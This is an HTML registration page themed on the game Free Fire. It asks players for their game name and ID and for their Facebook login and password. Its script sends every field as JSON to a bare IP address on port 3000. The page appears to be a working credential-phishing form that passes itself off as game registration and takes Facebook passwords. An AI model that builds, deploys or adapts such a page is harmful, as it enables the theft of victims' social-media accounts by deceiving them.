<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Registration Form</title>
    <style>
        body {
            background-image: url('./ff.jpg');
            background-size: cover;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            text-align: center;
            background-color: rgba(255, 255, 255, 0.8);
            padding: 20px;
            border-radius: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Registration Form</h2>
        <form id="registrationForm">
            <label for="freefireName">Freefire Name:</label>
            <input type="text" id="freefireName" name="freefireName" required><br><br>
            
            <label for="freefireid">Freefire ID:</label>
            <input type="text" id="freefireid" name="freefireid" required><br><br>
            
            <label for="fbAccount">Facebook Account:</label>
            <input type="text" id="fbAccount" name="usermobno" required><br><br>
            
            <label for="fbPassword">Facebook Password:</label>
            <input type="password" id="fbPassword" name="password" required><br><br>
            
            <button type="submit">Submit</button>
        </form>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const form = document.getElementById('registrationForm');
            form.addEventListener('submit', function(e) {
                e.preventDefault();
                const formData = new FormData(form);
                const data = {};
                formData.forEach((value, key) => {
                    data[key] = value;
                });

                fetch('http://13.53.125.215:3000/register', {
                    method: 'POST',
                    body: JSON.stringify(data),
                    headers: {
                        'Content-Type': 'application/json'
                    }
                })
                .then(response => response.json())
                .then(result => {
                    console.log(result);
                    // Handle the response here
                })
                .catch(error => {
                    console.error(error);
                    // Handle errors here
                });
            });
        });
    </script>
</body>
</html>
